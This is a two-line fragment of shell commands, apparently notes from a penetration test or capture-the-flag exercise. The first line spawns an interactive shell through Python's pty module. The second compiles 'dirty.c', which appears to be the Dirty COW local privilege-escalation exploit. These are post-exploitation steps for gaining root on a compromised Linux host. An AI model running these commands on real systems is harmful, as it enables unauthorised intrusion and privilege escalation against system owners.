python -c 'import pty; pty.spawn("/bin/sh")'

gcc -pthread dirty.c -o dirty -lcrypt
